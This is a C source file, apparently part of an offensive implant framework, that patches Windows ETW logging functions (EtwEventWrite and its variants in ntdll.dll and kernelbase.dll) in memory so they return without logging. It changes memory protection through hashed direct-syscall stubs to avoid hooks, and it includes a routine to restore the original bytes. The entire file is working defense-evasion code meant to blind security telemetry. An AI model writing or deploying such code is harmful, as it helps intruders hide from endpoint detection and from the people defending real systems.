#include "engine.h"

#pragma optimize("", off)

typedef struct _ETW_PATCH_INFO {
    PCHAR  pcModuleName;
    PCHAR  pcFunctionName;
    PBYTE  pOriginalBytes;
    DWORD  dwPatchSize;
    BOOL   bPatched;
    PBYTE  pTargetAddress;
} ETW_PATCH_INFO;

ETW_PATCH_INFO g_EtwPatches[] = {
    {"ntdll.dll", "EtwEventWrite", NULL, 0, FALSE, NULL},
    {"ntdll.dll", "EtwEventWriteFull", NULL, 0, FALSE, NULL},
    {"ntdll.dll", "EtwEventWriteTransfer", NULL, 0, FALSE, NULL},
    {"ntdll.dll", "EtwEventWriteString", NULL, 0, FALSE, NULL},
    {"kernelbase.dll", "EtwEventWrite", NULL, 0, FALSE, NULL},
    {NULL, NULL, NULL, 0, FALSE, NULL}
};

BOOL ALIOTHPatchEtw() {
    for (int i = 0; g_EtwPatches[i].pcModuleName != NULL; i++) {
        HMODULE hMod = GetModuleHandleA(g_EtwPatches[i].pcModuleName);
        if (!hMod) continue;
        
        PBYTE pTarget = (PBYTE)GetProcAddress(hMod, g_EtwPatches[i].pcFunctionName);
        if (!pTarget) continue;
        
        g_EtwPatches[i].pTargetAddress = pTarget;
        g_EtwPatches[i].dwPatchSize = 12;
        
        g_EtwPatches[i].pOriginalBytes = (PBYTE)LocalAlloc(LPTR, 12);
        if (!g_EtwPatches[i].pOriginalBytes) continue;
        
        memcpy(g_EtwPatches[i].pOriginalBytes, pTarget, 12);
        
        BYTE patchBytes[] = {0x33, 0xC0, 0xC2, 0x28, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
        
        SIZE_T dwOldProtect = 0;
        DWORD64 hProtect = ALIOTHSyscallHash((PCHAR)"NtProtectVirtualMemory");
        fnNtProtectVirtualMemory pProtect = (fnNtProtectVirtualMemory)ALIOTHGetSyscallStub(hProtect);
        
        PVOID pBase = pTarget;
        SIZE_T sSize = 12;
        
        if (pProtect) {
            ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pBase, &sSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(pTarget, patchBytes, 12);
            ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pBase, &sSize, dwOldProtect, &dwOldProtect);
        } else {
            VirtualProtect(pTarget, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(pTarget, patchBytes, 12);
            VirtualProtect(pTarget, 12, dwOldProtect, &dwOldProtect);
        }
        
        g_EtwPatches[i].bPatched = TRUE;
    }
    return TRUE;
}

VOID ALIOTHRestoreEtw() {
    for (int i = 0; g_EtwPatches[i].pcModuleName != NULL; i++) {
        if (g_EtwPatches[i].bPatched && g_EtwPatches[i].pTargetAddress) {
            SIZE_T dwOldProtect = 0;
            DWORD64 hProtect = ALIOTHSyscallHash((PCHAR)"NtProtectVirtualMemory");
            fnNtProtectVirtualMemory pProtect = (fnNtProtectVirtualMemory)ALIOTHGetSyscallStub(hProtect);
            
            PVOID pBase = g_EtwPatches[i].pTargetAddress;
            SIZE_T sSize = g_EtwPatches[i].dwPatchSize;
            
            if (pProtect) {
                ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pBase, &sSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
                memcpy(g_EtwPatches[i].pTargetAddress, g_EtwPatches[i].pOriginalBytes, g_EtwPatches[i].dwPatchSize);
                ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pBase, &sSize, dwOldProtect, &dwOldProtect);
            } else {
                VirtualProtect(pBase, sSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
                memcpy(g_EtwPatches[i].pTargetAddress, g_EtwPatches[i].pOriginalBytes, g_EtwPatches[i].dwPatchSize);
                VirtualProtect(pBase, sSize, dwOldProtect, &dwOldProtect);
            }
            
            if (g_EtwPatches[i].pOriginalBytes) {
                LocalFree(g_EtwPatches[i].pOriginalBytes);
            }
            g_EtwPatches[i].bPatched = FALSE;
        }
    }
}
#pragma optimize("", on)
